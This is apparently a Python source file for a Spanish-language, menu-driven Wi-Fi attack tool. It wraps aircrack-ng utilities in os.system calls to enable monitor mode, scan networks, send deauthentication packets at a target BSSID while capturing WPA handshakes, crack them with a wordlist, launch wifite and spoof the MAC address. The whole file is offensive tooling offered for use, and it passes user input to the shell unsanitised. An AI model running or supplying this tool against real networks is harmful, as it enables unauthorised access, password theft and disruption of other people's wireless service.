from banner.banner import *



def slowly(s):
  try:
    time.sleep(1)
    for w in s + '\n' :
      sys.stdout.write(w)
      sys.stdout.flush()
      time.sleep(7. / 100)
    print('\n')
    time.sleep(2)
  except KeyboardInterrupt:
    time.sleep(1)
    slowly(FAIL+'Exiting...')
    print('\n')
    sys.exit(0)

############################################################

print(" \033[1;37mIntroduzca una opción: ")
WH = int(input(" \033[1;32m>> \033[1;37m"))

if WH == 1:
	os.system("clear")
	banner()
	print(" \033[1;37mIngrese la interfaz: (\033[0;37mwlan\033[0;31m0 \033[1;37m| \033[0;37mwlan\033[0;34m1\033[1;37m)")
	interfaz = input(" \033[1;32m>> \033[0;37m")
	comando = "airmon-ng start {} && airmon-ng check kill".format(interfaz)
	os.system(comando)
	os.system("python3 wifi-hack.py")

elif WH == 2:
    os.system("clear")
    banner()
    print(" \033[1;37mIngrese la interfaz: (\033[0;37mwlan\033[0;31m0\033[0;37mmon \033[1;37m| \033[0;37mwlan\033[0;34m1\033[0;37mmon\033[1;37m)\033[0m")
    interfaz = input(" \033[1;32m>> \033[0;37m")
    comando = "airmon-ng stop {}".format(interfaz)  
    os.system(comando)
    os.system("python3 wifi-hack.py")

elif WH == 3:
	os.system("clear")
	print("\n\033[0m")
	os.system("sudo ifconfig")
	time.sleep(3)
	os.system("clear")
	os.system("python3 wifi-hack.py")

elif WH == 4:
    os.system("clear")
    banner()
    slowly(" \033[1;37mReiniciando red, por favor, espere...\033[0m")
    comando = "service networking restart && systemctl start NetworkManager"
    os.system(comando)
    print(" \033[1;31mProceso finalizado!\033[0m")
    time.sleep(2)
    os.system("clear")
    os.system("python3 wifi-hack.py")


elif WH == 5:
    os.system("clear")
    banner()
    print(" \033[1;37mIngrese la interfaz: (\033[0;37mwlan\033[0;31m0\033[0;37mmon \033[1;37m| \033[0;37mwlan\033[0;34m1\033[0;37mmon\033[1;37m)\033[0m")
    interfaz = input(" \033[1;32m>> \033[0;37m")
    comando = "airodump-ng {}".format(interfaz)
    print("\n \033[1;31m[AVISO] \033[0;37mCuando termine, presione \033[1;37mCTRL + C\033[0m")
    time.sleep(3)
    os.system(comando)
    time.sleep(9)
    os.system("clear")
    os.system("python3 wifi-hack.py") 

elif WH == 6:
    os.system("clear")
    banner()
    print(" \033[1;37mIngrese la interfaz: (\033[0;37mwlan\033[0;31m0\033[0;37mmon \033[1;37m| \033[0;37mwlan\033[0;34m1\033[0;37mmon\033[1;37m)\033[0m")
    interfaz = input(" \033[1;32m>> \033[0;37m")
    comando = "airodump-ng {}".format(interfaz)
    print("\n \033[1;31m[AVISO] \033[0;37mCuando termine, presione \033[1;37mCTRL + C\033[0m")
    time.sleep(2)
    os.system(comando)
    print("\n Ingrese el \033[1;32mBSSID\033[0m del objetivo:")
    bssid = str(input(" \033[1;32m>> \033[0;37m"))
    print("\n Ingrese el \033[1;32mCHANNEL\033[0m del objetivo:")
    channel = int(input(" \033[1;32m>> \033[0;37m"))
    print("\n Ingrese la \033[1;32mRUTA\033[0m donde desea guardar el handshake:")
    ruta = str(input(" \033[1;32m>> \033[0;37m"))
    print("\n Ingrese el número de paquetes (max 10000 | min 0):")
    paquetes = int(input(" \033[1;32m>> \033[0;37m"))
    comando = "airodump-ng -c {} --bssid {} -w {} {} | xterm -e aireplay-ng -0 {} -a {} {}".format(channel,bssid,ruta,interfaz,paquetes,bssid,interfaz)
    os.system(comando)
    time.sleep(2)
    os.system("clear")
    os.system("python3 wifi-hack.py")

elif WH == 7:
    os.system("clear")
    banner()
    print(" \033[1;37mIngrese el handshake:\033[0m")
    ruta = str(input(" \033[1;32m>> \033[0;37m"))
    print("")
    print(" \033[1;37mIngrese el diccionario:\033[0m")
    diccionario = str(input(" \033[1;32m>> \033[0;37m"))
    comando = "aircrack-ng {} -w {}".format(ruta,diccionario)
    os.system(comando)
    exit()

elif WH == 8:
    os.system("clear")
    os.system("wifite")
    time.sleep(4)
    os.system("python3 wifi-hack.py")

elif WH == 9:
    os.system("clear")
    banner()
    print(" \033[1;37mIngrese la interfaz: (\033[0;37mwlan\033[0;31m0 \033[1;37m| \033[0;37mwlan\033[0;34m1\033[1;37m)")
    interfaz = input(" \033[1;32m>> \033[0;37m")
    os.system("ifconfig {} down".format(interfaz))
    os.system("macchanger {} -r".format(interfaz))
    os.system("ifconfig {} up".format(interfaz))
    time.sleep(3)
    os.system("clear")
    os.system("python3 wifi-hack.py")   

elif WH == 0:
    os.system("clear")
    goodbye()
    exit() 

#END CODE       
#Follow me: https://github.com/R3LI4NT
